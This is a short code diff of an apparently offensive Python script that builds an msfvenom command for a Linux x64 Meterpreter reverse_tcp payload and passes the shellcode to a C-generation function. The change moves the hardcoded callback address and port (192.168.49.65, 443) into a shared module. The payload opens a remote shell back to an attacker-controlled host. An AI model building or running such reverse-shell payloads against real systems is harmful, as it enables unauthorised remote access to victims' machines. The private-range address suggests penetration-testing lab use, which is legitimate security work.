@@ -3,10 +3,8 @@ from ak import *
 import os
 import subprocess
 
-LHOST = "192.168.49.65"
-LPORT = 443
 OUT_FILENAME = 'msf-linux-x64'
-MSFVENOM_CMD = f"msfvenom -a x64 --platform Linux -p linux/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -e generic/none -b '\\x03' prependfork=true -t 300"
+MSFVENOM_CMD = f"msfvenom -a x64 --platform Linux -p linux/x64/meterpreter/reverse_tcp LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e generic/none -b '\\x03' prependfork=true -t 300"
 
 def generate_c(shellcode):
 
